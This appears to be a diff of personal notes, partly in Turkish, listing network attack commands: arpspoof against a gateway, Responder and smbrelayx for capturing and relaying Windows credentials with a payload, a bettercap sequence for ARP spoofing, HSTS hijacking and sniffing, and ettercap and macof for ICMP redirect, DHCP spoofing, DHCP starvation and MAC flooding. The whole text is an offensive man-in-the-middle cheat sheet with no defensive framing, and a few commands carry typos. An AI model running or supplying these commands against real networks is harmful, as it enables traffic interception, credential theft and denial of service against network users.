@@ -1,6 +1,9 @@
+#windows
+-------------------------
 arpspoof -i eth0 -t <gateway> <ip adresi>
 responder -I eth0 -w -r -f 
 smbrelayx.py -h <ip adresi> -e <payload>
+-------------------------
 
 bettercap
 net.recon on
@@ -10,3 +13,10 @@ set arp.spoof.fulldublex true
 set arp.spoof.internal true
 hstshijack/hstshijack 
 net.sniff on
+
+
+
+icmp redirect : ettercap -G 
+dhcp spoofing : ettercap -G
+dhcp starvation : etttercap -G 
+macof : macof -i <interface> 
